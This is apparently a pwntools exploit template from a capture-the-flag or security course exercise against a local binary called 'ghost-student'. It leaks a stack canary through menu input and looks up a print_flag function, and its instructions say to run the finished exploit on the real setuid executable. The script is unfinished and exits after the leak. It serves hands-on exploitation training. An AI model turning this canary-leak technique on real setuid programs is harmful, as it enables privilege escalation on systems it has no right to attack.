from pwn import *
import re

''' 
Instructions: 

1. This example shows you how to write exploit in Python and attach
GDB to inspect program state simultaneously. To run this script, you
must be inside tmux. Use the 'tmux' command to enter tmux.

2. {ChallengeName}-practice is a NON-SETUID version of the
challenge. This way, you can freely attach debuggers

3. Once you get the DUMMY FLAG, run this exploit on the real SETUID
executable to get the real flag

*** WARNING *** this file will not survive container restart. You must
    save this to ~/tmp before you disconnect


GOOD LUCK! 

'''

target = './ghost-student'
#context.update(arch='i386', os='linux')
#context.terminal = ['tmux','splitw','-h']
context.binary = ELF(target, checksec=False)
#context.log_level = 'debug'

print_flag = context.binary.symbols['print_flag']

p = process(target)

# BP @ canary check and ret

io = p

# Your exploit here!
p.sendline('2')
p.recvuntil(">>>")
p.recvuntil('>>>')
p.sendline('7')
_canary = p.recvuntil(">>>").decode().split('\n')[3].split(' ')
print(_canary)
exit()

io.interactive()
